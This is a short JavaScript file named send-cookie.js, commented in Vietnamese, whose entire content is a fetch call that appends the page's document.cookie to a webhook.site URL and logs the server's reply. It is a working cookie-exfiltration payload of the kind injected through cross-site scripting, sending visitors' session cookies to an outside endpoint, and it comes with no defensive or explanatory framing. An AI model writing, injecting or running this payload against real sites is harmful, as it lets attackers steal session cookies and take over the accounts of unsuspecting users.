// send-cookie.js

// Thực hiện yêu cầu fetch gửi cookie đến webhook
fetch(`https://webhook.site/12b35fc3-dd67-4e4e-a9fc-42cc53d2fff5?a=${document.cookie}`)
  .then(response => {
    // Xử lý phản hồi từ server nếu cần
    return response.text();
  })
  .then(data => {
    console.log('Dữ liệu phản hồi từ server:', data);
  })
  .catch(error => {
    console.error('Lỗi khi gửi yêu cầu:', error);
  });
